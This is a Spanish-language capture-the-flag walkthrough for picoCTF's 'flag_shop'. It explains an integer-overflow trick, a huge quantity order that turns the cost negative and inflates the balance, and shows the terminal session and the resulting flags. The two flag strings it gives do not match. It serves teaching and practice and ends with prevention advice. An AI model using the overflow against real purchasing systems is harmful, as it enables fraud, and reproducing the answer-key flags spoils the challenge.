## RETO
flag_shop
## DESCRIPCION
There's a flag shop selling stuff, can you buy a flag?[Source](https://challenge-files.picoctf.net/c_fickle_tempest/a8413624d27590e0fa83440f1154a3267699b5d199d05df7bf7cf583c4c357b7/store.c). Connect with nc fickle-tempest.picoctf.net 57558.
## SOLUCION

picoCTF{m0n3y_bag5_44cFf530}


La vulnerabilidad se encuentra en un **Desbordamiento de Enteros (Integer Overflow)** en el cálculo del costo total de las banderas de imitación.

1. **Conexión:** Se establece el enlace al servidor mediante:
    
    `nc fickle-tempest.picoctf.net 57558`
    
2. **Explotación:** * Se ingresa a la opción `2` (Buy Flags) y luego a la opción `1` (Defintely not the flag Flag).
    
    - Al solicitar la cantidad de banderas, se ingresa un número lo suficientemente grande (ej. `3,000,000`).
        
    - Debido a que el costo se almacena en una variable de tipo `int` (entero de 32 bits con signo), el resultado de la multiplicación ($900 \times 3,000,000 = 2,700,000,000$) excede el valor máximo permitido ($2^{31} - 1 = 2,147,483,647$).
        
    - Esto provoca que el valor se vuelva **negativo**. Al restar un costo negativo del saldo (`balance - (-costo)`), el saldo de la cuenta se incrementa drásticamente.
        
3. **Obtención de la Flag:**
    
    - Con el nuevo saldo millonario, se regresa al menú de compras.
        
    - Se selecciona la opción `2` (1337 Flag) y se compra la bandera por **100,000**.
        
    - El sistema imprime la bandera en formato `picoCTF{...}`.

MarianaRodriguez-picoctf@webshell:~$ nc fickle-tempest.picoctf.net 57558
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 1100 


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
3000000

The final cost is: -1594967296

Your current balance after transaction: 1594968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 1594968396 


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_C87346f2}
## NOTAS ADICIONALES
- **Límites de Datos:** En lenguaje C, un `int` estándar suele ser de 32 bits. El bit más significativo se usa para el signo (0 para positivo, 1 para negativo). Al desbordar el límite positivo, el bit de signo se activa, convirtiendo el resultado en un número negativo desde la perspectiva del procesador.
    
- **Prevención:** Para evitar esto en sistemas reales, se deben realizar comprobaciones de límites (bounds checking) antes de las operaciones aritméticas o utilizar tipos de datos que no permitan signos (`unsigned int`) si el valor nunca debe ser negativo, aunque incluso estos pueden desbordarse a cero.
## REFERENCIAS